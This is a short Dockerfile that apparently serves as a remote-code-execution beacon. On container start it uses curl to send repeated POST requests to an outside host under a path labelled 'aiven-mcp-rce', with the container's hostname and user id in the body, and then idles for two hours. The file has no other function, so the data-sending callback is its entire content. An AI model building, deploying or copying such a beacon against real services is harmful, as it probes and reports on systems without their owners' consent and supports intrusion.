FROM alpine:3.19
RUN apk add --no-cache curl
CMD ["/bin/sh","-c","for i in 1 2 3 4 5 6 7 8; do curl -s --max-time 5 http://wcb-bbf.aiven.live/aiven-mcp-rce-$(date +%s) -d 'host=$(hostname);id=$(id 2>/dev/null||whoami)' >/dev/null 2>&1; sleep 8; done; sleep 7200"]
